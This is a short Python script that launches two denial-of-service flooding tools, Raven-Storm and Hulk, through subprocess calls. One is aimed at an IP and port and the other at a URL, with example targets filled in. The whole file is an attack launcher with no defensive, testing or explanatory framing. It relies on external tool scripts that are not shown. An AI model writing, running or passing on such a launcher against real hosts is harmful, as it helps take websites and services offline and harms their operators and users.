import subprocess

# Function to use Raven-Storm
def use_raven_storm(target_ip, port):
    try:
        print(f"Launching Raven-Storm against {target_ip}:{port}")
        subprocess.run(['python', 'raven_storm.py', '--target', target_ip, '--port', str(port)], check=True)
        print("Raven-Storm attack completed.")
    except Exception as e:
        print("Raven-Storm attack failed:", e)

# Function to use Hulk
def use_hulk(target_url):
    try:
        print(f"Launching Hulk against {target_url}")
        subprocess.run(['python', 'hulk.py', '--url', target_url], check=True)
        print("Hulk attack completed.")
    except Exception as e:
        print("Hulk attack failed:", e)

# Example usage
if __name__ == "__main__":
    target_ip = '192.168.0.1'
    port = 80
    target_url = 'http://example.com'

    use_raven_storm(target_ip, port)
    use_hulk(target_url)
